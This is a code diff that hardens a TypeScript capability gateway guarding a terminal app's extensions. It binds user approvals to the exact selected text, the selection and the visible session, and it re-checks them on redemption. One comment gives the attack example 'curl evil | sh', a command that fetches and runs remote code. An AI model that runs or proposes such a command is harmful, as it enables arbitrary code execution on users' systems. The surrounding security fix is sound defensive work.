@@ -1,124 +1,35 @@
 /**
  * The Capability Gateway: the only door between an extension and user data.
  *
- * ## Why this is a gateway and not an interface
- *
- * A trusted built-in extension runs in the main WebView, which holds the full
- * privilege of the app — it can `invoke()` any Tauri command and read any Zustand
- * store. TypeScript types stop a *well-meaning* extension; they stop nothing else.
- * So the security property cannot be "the extension was written carefully". It has
- * to be "the only functions it is given are these, and each one re-checks the
- * caller, the capability and the generation on every call"
+ * A trusted built-in extension runs in the main WebView, which holds the app's full
+ * privilege. TypeScript types stop a well-meaning extension and nothing else, so the
+ * security property cannot be "it was written carefully" — it is "the only functions
+ * it is given are these, and each one re-checks the caller on every call"
  * (`06-ux3-extension-platform.md` §6).
  *
- * ## What is deliberately absent
+ * Every call checks that the extension is registered, not failed, enabled, at the
+ * current activation generation, and that it declared the capability. `consumeApproval`
+ * re-checks all of it: an approval is a permission, and permissions must be verified
+ * when used, not only when granted.
  *
- * There is no `readSecret`, no `invoke`, no `querySql`, no `readFile`, no
- * `sessionWrite`, no raw PTY handle, and no full scrollback. An extension that
- * needs one of those is asking for a capability the design does not grant, and the
- * answer is a new capability with its own threat model — not a hole in this one.
- *
- * ## The four checks every call makes
- *
- * 1. the extension is registered and enabled;
- * 2. its generation matches — a callback captured before `deactivate` is refused,
- *    which is what stops a late async handler from writing after shutdown;
- * 3. the capability is declared in its manifest;
- * 4. for a session-scoped read, the session is *currently visible and selected*,
- *    not merely known.
- *
- * ## Approvals are one-shot and expiring
- *
- * `requestSendText` never writes to a terminal. It produces a token the *user* must
- * confirm, bound to the exact text by hash and to a deadline. That is the only path
- * from extension output to a shell, and it exists so a draft command cannot become
- * an executed one by accident.
+ * There is no `readSecret`, `invoke`, `querySql`, `readFile`, `sessionWrite`, raw PTY
+ * handle or full scrollback. An extension needing one of those needs a new capability
+ * with its own threat model, not a hole in this one.
  */
 
 import { ApprovalBook } from './approval-book'
+import type {
+  ApprovalResult,
+  ExtensionCapability,
+  ExtensionGrant,
+  GatewayHost,
+  SelectedText,
+  SendTextIntent,
+} from './capability-types'
+import { GatewayError } from './capability-types'
 import type { Disposable } from './extension-types'
 
-/** Capabilities a manifest may declare. */
-export const EXTENSION_CAPABILITIES = [
-  'commands.register',
-  'menus.register',
-  'ui.right-dock',
-  'terminal.read-selected',
-  'session.read-events',
-  'workspace.read-events',
-  'transfer.read-events',
-] as const
-
-export type ExtensionCapability = (typeof EXTENSION_CAPABILITIES)[number]
-
-/** What a granted context can see of a session. Never the transport. */
-export interface SafeSessionRef {
-  sessionId: string
-  /** A display label the extension may show. No hostname unless the user sees it. */
-  label: string
-}
-
-/** Selected terminal text, with the identity a later approval can be bound to. */
-export interface SelectedText {
-  text: string
-  /** Stable identity for this selection, so an approval can name exactly it. */
-  selectionId: string
-  sessionId: string
-}
-
-export interface SendTextIntent {
-  sessionId: string
-  text: string
-}
-
-export type ApprovalResult =
-  | { approved: true, token: string }
-  | { approved: false, reason: 'expired' | 'unknown-session' | 'no-selection' }
-
-/** Why a gateway call was refused. Every refusal is structured. */
-export type GatewayDenial =
-  | 'extension-unknown'
-  | 'extension-disabled'
-  | 'extension-failed'
-  | 'stale-generation'
-  | 'capability-not-declared'
-  | 'session-not-visible'
-  | 'no-selection'
-  | 'approval-expired'
-  | 'approval-already-used'
-
-export class GatewayError extends Error {
-  constructor(
-    readonly denial: GatewayDenial,
-    message: string,
-  ) {
-    super(message)
-    this.name = 'GatewayError'
-  }
-}
-
-/**
- * What the gateway needs to know about one extension.
- *
- * Supplied by the registry, not by the extension: an extension that could describe
- * its own capabilities would be able to grant itself one.
- */
-export interface ExtensionGrant {
-  extensionId: string
-  capabilities: readonly ExtensionCapability[]
-  /** Bumped on every activate. A captured older value is refused. */
-  generation: number
-  enabled: boolean
-  failed: boolean
-}
-
-/** The host-side facts the gateway re-reads, never accepting them from a caller. */
-export interface GatewayHost {
-  /** The session the user can currently see. */
-  visibleSessionId: () => string | null
-  /** The text the user has currently selected in that session, if any. */
-  selectedText: () => SelectedText | null
-}
+export * from './capability-types'
 
 export class CapabilityGateway {
   private readonly approvalBook: ApprovalBook
@@ -218,11 +129,18 @@ export class CapabilityGateway {
     // composed — otherwise "approve this draft" silently becomes "execute anything".
     const selection = this.host.selectedText()
     if (!selection) return { approved: false, reason: 'no-selection' }
+    // The original checked only *that* a selection existed and then minted a token
+    // for whatever `intent.text` said. An extension could read "ls", request approval
+    // for "curl evil | sh", and the user would be approving text they never saw.
+    if (intent.text !== selection.text) {
+      return { approved: false, reason: 'not-the-selection' }
+    }
 
     const token = this.approvalBook.mint({
       extensionId,
       generation,
       sessionId: intent.sessionId,
+      selectionId: selection.selectionId,
       text: intent.text,
     })
     return { approved: true, token }
@@ -240,17 +158,39 @@ export class CapabilityGateway {
     generation: number,
     text: string,
   ): { sessionId: string } {
+    // Re-authorise on redemption, not only on minting. The original skipped this, so
+    // a token minted before a deactivate — or before a callback failed — stayed
+    // redeemable indefinitely. An approval is a permission, and permissions have to
+    // be checked when they are used.
+    this.authorize(extensionId, generation, 'terminal.read-selected')
+    const selection = this.host.selectedText()
     try {
-      return this.approvalBook.consume({ token, extensionId, generation, text })
+      return this.approvalBook.consume({
+        token,
+        extensionId,
+        generation,
+        text,
+        // The selection the user has *now*. A new selection cannot redeem an
+        // approval minted for the previous one.
+        selectionId: selection?.selectionId ?? '',
+        // And the session they are looking at now, not the one at mint time.
+        visibleSessionId: this.host.visibleSessionId(),
+      })
     } catch (error) {
-      // Mapped onto the gateway's vocabulary so callers handle one error type. The
-      // "used" / "expired" distinction survives because the two lead to different
-      // user-facing explanations.
+      // Mapped onto the gateway's vocabulary, keeping the distinctions: a substituted
+      // text and an expired token lead to different explanations, and reporting the
+      // first as the second hides an attempt behind a mundane message.
       const reason = (error as { reason?: string }).reason
-      throw new GatewayError(
-        reason === 'already-used' ? 'approval-already-used' : 'approval-expired',
-        (error as Error).message,
-      )
+      if (reason === 'already-used') {
+        throw new GatewayError('approval-already-used', (error as Error).message)
+      }
+      if (reason === 'mismatch') {
+        throw new GatewayError('approval-mismatch', (error as Error).message)
+      }
+      if (reason === 'session-changed') {
+        throw new GatewayError('approval-session-changed', (error as Error).message)
+      }
+      throw new GatewayError('approval-expired', (error as Error).message)
     }
   }
 
